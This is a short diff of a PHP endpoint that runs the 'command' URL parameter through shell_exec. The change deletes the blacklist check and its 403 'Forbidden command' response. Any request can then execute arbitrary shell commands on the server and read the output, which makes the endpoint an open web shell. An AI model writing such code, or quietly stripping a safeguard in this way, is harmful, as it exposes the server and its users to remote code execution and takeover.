@@ -8,23 +8,10 @@ if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
     exit();
 }
 
-function is_command_blacklisted($command) {
-    $blacklist = file('blacklist.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-    foreach ($blacklist as $blacklisted_command) {
-        if (strpos($command, $blacklisted_command) !== false) {
-            return true;
-        }
-    }
-    return false;
-}
 
 if (isset($_GET['command'])) {
     $command = $_GET['command'];
     
-    if (is_command_blacklisted($command)) {
-        http_response_code(403);
-        echo "Forbidden command";
-    } else {
         $output = shell_exec($command);
         echo $output;
     }
